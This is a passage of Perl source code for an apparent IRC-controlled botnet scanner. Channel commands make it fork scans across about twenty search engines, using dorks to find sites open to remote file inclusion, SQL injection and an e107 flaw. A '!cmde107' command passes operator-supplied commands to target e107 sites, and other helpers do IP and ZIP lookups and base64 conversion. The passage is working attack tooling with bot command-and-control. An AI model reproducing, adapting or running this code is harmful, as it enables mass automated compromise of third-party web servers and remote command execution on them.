                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4RFI2]7 Search Engine Loading ...");
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google2";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### alltheweb Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "alltheweb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### altavista Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "altavista";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### naver Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "naver";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### onet Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### sapo Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "sapo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### search Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "search";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### msn Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "msn";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### lycos Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### snz Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "snz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### witch Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "witch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### seznam Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "seznam";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### goodsearch Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "goodsearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### hotbot Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "hotbot";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

		#####################################################################
        #####################         SQL SQL SQL         ###################
        ##################################################################### google Engine		
		
		if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2]10 Dork :4 $d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2]10 File :4 $bugx");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2]7 Search Engine Loading ...");
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google2";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### alltheweb Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "alltheweb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### altavista Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "altavista";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### naver Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "naver";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### onet Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### sapo Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "sapo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### search Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "search";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### msn Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "msn";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### lycos Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### snz Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "snz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### witch Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "witch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### seznam Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "seznam";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### goodsearch Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "goodsearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### hotbot Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "hotbot";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$sql\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &sqlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

		#####################################################################
        #####################       e107 e107 e107        ###################
        ##################################################################### google Engine		
		if ($msg=~ /PRIVMSG $channel :!cmde107\s+(.*?)\s+(.*)/){
			my $url = $1;
			my $cmd = $2;
			&cmde107($url,$cmd);
		}
		if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e1072]10 Dork :4 $d0rk");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e1072]10 File :4 $bugx");
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e1072]7 Search Engine Loading ...");
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "google2";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### alltheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "alltheWeb";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Virgillio";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### altavista Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "altavista";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### naver Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "naver";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### onet Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "onet";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### sapo Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "sapo";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### search Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "search";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### msn Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "msn";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### lycos Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "lycos";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### snz Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "snz";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### witch Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "witch";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### seznam Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "seznam";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### goodsearch Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "goodsearch";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### hotbot Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "hotbot";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$e107\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = "/contact.php";
                    my $d0rk = $1;
                    &e107scan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

		#####################################################
		####           [ IP Location Engine ]            ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :!ip\s+(.*)/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $ip = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][14 Searching7 ".$ip." 12Location ... ");
		my $website = "http://www.ip2location.com/";
		my ($useragent,$request,$response,%form);
		undef %form;
		$form{ip}  = $ip;
		$useragent = LWP::UserAgent->new;
		$useragent->timeout(10);
		$request   = POST $website,\%form;
		$response  = $useragent->request($request);
		if ($response->is_success) {
			my $res = $response->content;
			if ($res =~ m/Your IP address is (.*)<br>City: (.*)<br\/>Country: (.*)<br>Continent: (.*)<br>Time/g) {
				my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
				sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 IP Address :14 ".$ipaddress."2]");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 City       :14 ".$city."2]");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 Country    :14 ".$country."2]");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 Continent  :14 ".$continent."2]");
					}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 $ip 12-> 4Invalid address or IP not found."); }
				}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4IP2][3 Cannot open IP-Data Base"); }
		     }
		exit;
		  }
		}

		#####################################################
		####             [ US ZIP Engine ]               ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :!zip\s+(.*)/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $zip = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 Looking up7 ".$zip." 12ZIP Code ...2]");
		my $website   = "http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=".$zip."&Go=Go";
		my $request   = HTTP::Request->new(GET=>$website);
		my $useragent = LWP::UserAgent->new();
		$useragent->timeout(10);
		my $response  = $useragent->request($request);
		if ($response->is_success) {
		my $res  = $response->content;
		if ($res =~ m/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g) {
			my ($city,$state,$zipcode,$county,$area) = ($1,$2,$3,$4,$6);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 City Name   :14 ".$city."2]");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 State Code  :14 ".$state."2]");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 ZIP Code    :14 ".$zipcode."2]");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 County Name :14 ".$county."2]");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 Area Code   :14 ".$area."2]");
				}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 $zip 4is not a valid ZIP code."); }
			}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4ZIP2][3 Cannot open ZIP-DB"); }
			}
		exit;
		  }
		}

		#####################################################
		####              [ Base64 Engine ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :!base64 (.*)$/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $hash      = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Base642][3 Try To Convert :3 $hash 2]");
		my $base64_encoded = encode_base64($hash);
		my $base64_decoded = decode_base64($hash);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Base642][3 Decode :3 $base64_decoded 2]");
		sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Base642][3 Encode :3 $base64_encoded 2]");
			}
		  exit;
		  }
		}

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}
##################################################################### Procedure
sub encrypt() {
{
my $teks=$1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Encrypt15)12 Trying to encrypt7 ".$teks." 12...");
my $hashing = "http://d00r.110mb.com/hash.php?enc=".$teks;
my $request   = HTTP::Request->new(GET=>$hashing);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(10);
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res   = $response->content;
	if ($res =~ m/MD5:([0-9,a-f]{32})<br>SHA1:([0-9,a-f]{40})<br>B64:(.*)/g) {
